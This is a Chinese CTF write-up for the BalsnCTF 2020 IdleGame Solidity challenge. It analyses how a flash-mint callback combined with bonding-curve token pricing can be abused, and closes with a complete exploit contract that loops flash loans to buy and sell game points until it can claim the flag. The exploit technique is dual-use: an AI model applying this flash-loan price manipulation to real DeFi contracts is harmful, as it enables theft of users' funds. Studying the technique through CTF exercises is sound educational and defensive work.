> 原文链接: https://www.anquanke.com//post/id/249645 


# BalsnCTF 2020 IdleGame


                                阅读量   
                                **23487**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01e356375aa23fdc1d.png)](https://p2.ssl.qhimg.com/t01e356375aa23fdc1d.png)



这是BalsnCTF中以 ERC20的闪电贷 和 Continuous Token 的概念为基础所出的一道题目。整体来说现在智能合约的出题方向一般不再以简单的合约漏洞为底层。<br>
而是选择了 以 defi 这种去中心化金融的实例作为考察点。或者是考察一些独特的opcode构造。<br>
总的来说我还是更加喜欢 Defi这种更偏向于现实审计的内容。<br>
贴出题目代码：

```
pragma solidity =0.5.17;

import "./Tokens.sol";

contract BalsnToken is ERC20 `{`
    uint randomNumber = RN;
    address public owner;

    constructor(uint initialValue) public ERC20("BalsnToken", "BSN") `{`
        owner = msg.sender;
        _mint(msg.sender, initialValue);
    `}`

    function giveMeMoney() public `{`
        require(balanceOf(msg.sender) == 0, "BalsnToken: you're too greedy");
        _mint(msg.sender, 1);
    `}`
`}`

contract IdleGame is FlashERC20, ContinuousToken `{`
    uint randomNumber = RN;
    address public owner;
    BalsnToken public BSN;
    mapping(address =&gt; uint) public startTime;
    mapping(address =&gt; uint) public level;

    event GetReward(address, uint);
    event LevelUp(address);
    event BuyGamePoints(address, uint, uint);
    event SellGamePoints(address, uint, uint);
    event SendFlag(address);

    constructor (address BSNAddr, uint32 reserveRatio) public ContinuousToken(reserveRatio) ERC20("IdleGame", "IDL") `{`
        owner = msg.sender;
        BSN = BalsnToken(BSNAddr);
        _mint(msg.sender, 0x9453 * scale);
    `}`

    function getReward() public returns (uint) `{`
        uint points = block.timestamp.sub(startTime[msg.sender]);
        points = points.add(level[msg.sender]).mul(points);
        _mint(msg.sender, points);
        startTime[msg.sender] = block.timestamp;
        emit GetReward(msg.sender, points);
        return points;
    `}`

    function levelUp() public `{`
        _burn(msg.sender, level[msg.sender]);
        level[msg.sender] = level[msg.sender].add(1);
        emit LevelUp(msg.sender);
    `}`

    function buyGamePoints(uint amount) public returns (uint) `{`
        uint bought = _continuousMint(amount);
        BSN.transferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, bought);
        emit BuyGamePoints(msg.sender, amount, bought);
        return bought;
    `}`

    function sellGamePoints(uint amount) public returns (uint) `{`
        uint bought = _continuousBurn(amount);
        _burn(msg.sender, amount);
        BSN.transfer(msg.sender, bought);
        emit SellGamePoints(msg.sender, bought, amount);
        return bought;
    `}`

    function giveMeFlag() public `{`
        _burn(msg.sender, (10 ** 8) * scale);   // pass this
        Setup(owner).giveMeFlag();  // hit here
        emit SendFlag(msg.sender);
    `}`
`}`

contract Setup `{`
    uint randomNumber = RN;
    bool public sendFlag = false;
    BalsnToken public BSN;
    IdleGame public IDL;

    constructor() public `{`
        uint initialValue = 15000000 * (10 ** 18);
        BSN = new BalsnToken(initialValue);
        IDL = new IdleGame(address(BSN), 999000);
        BSN.approve(address(IDL), uint(-1));
        IDL.buyGamePoints(initialValue);
    `}`

    function giveMeFlag() public `{`
        require(msg.sender == address(IDL), "Setup: sender incorrect");
        sendFlag = true;
    `}`
`}`
```

发现其中引入了Tokens.sol 其中没有特殊的漏洞点，这里说明一下里面主要制定了怎样的标准：
1. SafeMath 防止溢出
1. ERC20标准接口
1. Flash Loan ERC20 接口
1. ContinuousToken
我们优先审计 giveMeFlag()相关内容。

```
function giveMeFlag() public `{`
        _burn(msg.sender, (10 ** 8) * scale);   // pass this
        Setup(owner).giveMeFlag();  // hit here
        emit SendFlag(msg.sender);
    `}`
```

这里非常明显 首先_burn是 ERC的接口，通过PHPSTORM构建整个目录可以很好的进行函数跳转；我们可以发现就是一个类似于捐款或者说是 销毁一些Token的方法。也就是我们需要有  10^8 *(10^`{`18`}`)  可以理解为<br> 10^8  个代币。<br>
之后他会调用SetUp合约的方法 应该只是为了记录成功调用的人。没有具体需要通过的。然后就会触发flag事件了，那我们需要做的就是让我们的账户有足够的代币去消耗。<br>
可以看到在闪电贷的这里

```
interface IBorrower `{`
    function executeOnFlashMint(uint amount) external;
`}`

contract FlashERC20 is ERC20 `{`
    event FlashMint(address to, uint amount);

    function flashMint(uint amount) external `{`
        _mint(msg.sender, amount);
        IBorrower(msg.sender).executeOnFlashMint(amount);
        _burn(msg.sender, amount);
        emit FlashMint(msg.sender, amount);
    `}`
`}`
```

他在一个合约中实现了 Token的 贷款 以及收回 ，但是中间它允许执行msg.sender的一个IBorrower方法，那么暂时这个我们可以稍微搁置一下，因为还不知道应该如何进行利用。我们优先往下查看闪电贷中的相关内容。

我们可以关注到我们主要操控的题目合约Idlegame中的几个重要方法：

```
function buyGamePoints(uint amount) public returns (uint) `{`
uint bought = _continuousMint(amount);
BSN.transferFrom(msg.sender, address(this), amount);
_mint(msg.sender, bought);
emit BuyGamePoints(msg.sender, amount, bought);
return bought;
`}`

function sellGamePoints(uint amount) public returns (uint) `{`
uint bought = _continuousBurn(amount);
_burn(msg.sender, amount);
BSN.transfer(msg.sender, bought);
emit SellGamePoints(msg.sender, bought, amount);
return bought;
`}`
```

这里有一个我们没见过的叫_continuousMint和 _continuousBurn的函数<br>
这个我们跟一下

[![](https://p0.ssl.qhimg.com/t013ad8303e16536b1d.png)](https://p0.ssl.qhimg.com/t013ad8303e16536b1d.png)

发现来自这里<br>
其中有一个calculateContinuousMintReturn函数 继续跟

[![](https://p3.ssl.qhimg.com/t01f47b2e1427ccfa0d.png)](https://p3.ssl.qhimg.com/t01f47b2e1427ccfa0d.png)

可以发现来自如下

[![](https://p3.ssl.qhimg.com/t01b786699dfd804e3a.png)](https://p3.ssl.qhimg.com/t01b786699dfd804e3a.png)

我们直接去Ropsten查看源码，应该是一个开源的。<br>[https://ropsten.etherscan.io/address/0xF88212805fE6e37181DE56440CF350817FF87130#code](https://ropsten.etherscan.io/address/0xF88212805fE6e37181DE56440CF350817FF87130#code)<br>
发现比较巨大的代码，选择去网上查询一下他到底是在干什么<br>
我们可以知道他是一种联合曲线模型，相当于用于计算汇率的一种东西。

[![](https://p1.ssl.qhimg.com/t01140eb71686eda851.png)](https://p1.ssl.qhimg.com/t01140eb71686eda851.png)

通过这里的分析

[![](https://p2.ssl.qhimg.com/t0134ee3aa1fe97bd30.png)](https://p2.ssl.qhimg.com/t0134ee3aa1fe97bd30.png)

那么我们就可以了解到他每一次在buyGamePoints时和sellgamePoints的时候都会计算一遍当前的兑换汇率。如果我们能利用闪电贷的方法，首先贷款BSN买IDL，这样IDL的整体汇率就会下降，可以买到更多的IDL，闪电贷结束之后BSN总值恢复。IDL的价值也会上升，把额外的IDL在高价卖出。这样反复循环，就可以实现利润的赚取了。

## 具体代码部署

Setup是唯一需要部署的，可能是作者为了部署题目方便写的一个合约。<br>
只能在Ropsten上测试，因为Bancor协议合约在Ropsten上。<br>
题目里面的uint randnumber是为了正式比赛 防止上车用的。自己部署随便填个数字进去就可以了。

部署之后就可以再把另外两个合约直接At Address上去了

[![](https://p0.ssl.qhimg.com/t0111dbac6b0eadbe59.png)](https://p0.ssl.qhimg.com/t0111dbac6b0eadbe59.png)

写出解题合约如下:<br>
借鉴了[https://github.com/perfectblue/ctf-writeups/tree/master/2020/BalsnCTF/IdleGame](https://github.com/perfectblue/ctf-writeups/tree/master/2020/BalsnCTF/IdleGame)

```
contract hack`{`
    address  public IDLE=0x3C58715D56513Fd8cE364AB3e797f5D90f346381;
    address  public BALN=0x47897d8B51e55F9AeC4aB0f871F4b85DC3a16776;
    uint public myIDLE;
    uint public temp;
    uint public loan=99056419041694676677800000000000000002;
    bool public first;
    IdleGame IDL=IdleGame(IDLE);
    BalsnToken BSL=BalsnToken(BALN);
    uint public boo;
    function exp()public`{`
        BSL.approve(IDLE,uint(-1));
        BSL.giveMeMoney();
        IDL.flashMint(loan);
        temp=IDL.sellGamePoints(myIDLE);
        IDL.flashMint(loan);
        temp=IDL.sellGamePoints(myIDLE);
        IDL.flashMint(loan);
        temp=IDL.sellGamePoints(myIDLE);
        IDL.flashMint(loan);
        IDL.giveMeFlag();
    `}`
    function executeOnFlashMint(uint amount) external`{`
        if(first==false)
        `{`
            myIDLE=IDL.buyGamePoints(1);
            first=true;
        `}`
        else`{`
            myIDLE=IDL.buyGamePoints(temp);

        `}`

    `}`
`}`
```
